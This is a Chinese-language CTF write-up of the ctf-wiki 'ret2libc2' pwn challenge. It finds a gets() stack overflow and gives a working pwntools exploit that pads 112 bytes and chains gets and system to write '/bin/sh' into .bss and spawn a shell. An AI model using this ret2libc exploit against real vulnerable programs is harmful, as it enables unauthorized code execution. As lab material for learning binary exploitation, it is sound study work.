> 参考资料：[https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#2](https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#2)
>
> 示例文件：[https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc2](https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc2/)
>

将文件下载下来，检查一下文件的保护

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596684661609-9b07bc0a-6580-45f2-ad69-fea776a5f19b.png)

拖入IDA中，查看一下代码：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596684714006-50b5b74e-8b28-4a71-b231-b4660f264b4c.png)

发现危险栈溢出函数gets，同时在secure()函数中发现了system函数

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596684813763-cd3575fa-eafb-4ccf-868e-2b93edc30fce.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596684836151-12df2042-95e0-44d2-983a-4b9552356bf4.png)

但是并没有找到"/bin/sh"的字样，但是我们在bss段找到了一些可以利用的空间

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596685004938-d2beeefc-d1fc-459c-a4bc-3ca75af23bbc.png)

我们可以在这个空间里写入“/bin/sh”

> 注意：由于程序开了NX保护，所以不可以向栈内写入内容
>

使用cycilc命令可以测出程序的栈偏移为112（省略此处的详细步骤）****

exp如下：

```python
from pwn import *
bss_addr = 0x0804A080
gets_plt = 0x08048460
sys_plt  = 0x08048490

io=process('./ret2libc2')
io.recvuntil('What do you think ?')
payload = 'A'*112 + p32(gets_plt) + p32(sys_plt) + p32(bss_addr)+p32(bss_addr)
io.sendline(payload)
io.sendline('/bin/sh')
io.interactive()
```

payload解读：

首先使用112个A字符填充栈，使栈发生溢出，再用gets函数的plt地址来覆盖原返回地址，使程序流执行到gets函数，参数就是bss段的地址（bss段的变量），目的是为了使用gets函数将/bin/sh 写入到bss段中。接下来在使用systm函数覆盖gets函数的返回地址，使程序执行到system函数，其参数也是bss段中的内容，也就是/bin/sh。最后的io.sendline('/bin/sh')是为了将bss段上变量的内容替换成/bin/sh（也就是说在执行sendline('/bin/sh')之前，bss段上的变量未被初始化，其内容为空）。

> payload中第一个p32(bss_addr)是gets函数的参数，第二个是system的参数
>

> **<font style="color:#F5222D;">注：程序的走向是由栈来决定的</font>**
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596772127430-47ff3fac-e16a-4d38-b1e6-544f260d127d.png)

getshell

